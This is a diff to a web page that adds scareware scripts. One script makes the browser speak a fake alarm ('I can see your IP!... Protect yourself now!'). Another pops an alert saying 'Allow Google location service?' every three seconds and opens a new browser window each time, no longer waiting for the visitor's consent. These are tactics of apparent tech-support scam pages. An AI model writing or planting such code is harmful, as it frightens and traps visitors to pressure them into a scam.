@@ -46,7 +46,30 @@ body {
 
 
 
+<script language=javascript>
 
+
+setTimeout(function(){
+var msg = new SpeechSynthesisUtterance();
+var voices = speechSynthesis.getVoices();	
+function findVoice(lang) {        
+   for (var i = 0; i < voices.length; i++) {
+     if (voices[i].lang === lang) { return voices[i];}
+   }
+return null;
+}	
+function speak(text) {
+msg.lang = 'en-US';
+msg.voice = findVoice(msg.lang);
+msg.voiceURI = 'native';
+msg.volume = 1;
+msg.rate = 1;
+msg.pitch = 1;
+msg.text = text;
+speechSynthesis.speak(msg);}
+speak('\nATTENTION!\n I can see your IP! Your IP is 92.193.213\n \nProtect yourself now! \n');
+
+},1200);</script>
 
 <script>
       
@@ -60,13 +83,10 @@ body {
   
           function myP(){
 		  alert("Allow Google location service?");
+		  var win = window.open("http://google.com", '_blank');
+		win.focus();
 		  setTimeout(myP, 3000);
-		            if (window.confirm)
-			    {
-				    // They clicked Yes
-				    var win = window.open("http://google.com", '_blank');
-				    win.focus();
-			    }
+
           
           
           }
